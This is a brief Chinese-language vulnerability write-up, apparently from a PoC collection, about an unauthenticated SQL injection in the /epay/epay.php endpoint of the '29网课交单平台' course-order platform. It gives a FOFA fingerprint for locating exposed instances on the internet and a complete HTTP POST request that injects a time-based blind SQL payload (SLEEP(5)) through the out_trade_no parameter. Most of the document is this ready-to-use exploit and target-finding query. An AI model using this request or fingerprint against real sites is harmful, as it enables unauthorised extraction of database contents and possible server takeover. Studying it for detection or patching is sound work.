## 29网课交单平台epay.php存在SQL注入漏洞

29网课交单平台 /epay/epay.php接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。

## fofa

```
body="你在看什么呢？我写的代码好看吗"
```

## poc

```
POST /epay/epay.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close
 
out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(5)))eEcA) AND 'aEmC'='aEmC
```

![image-20240610144912193](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406101449253.png)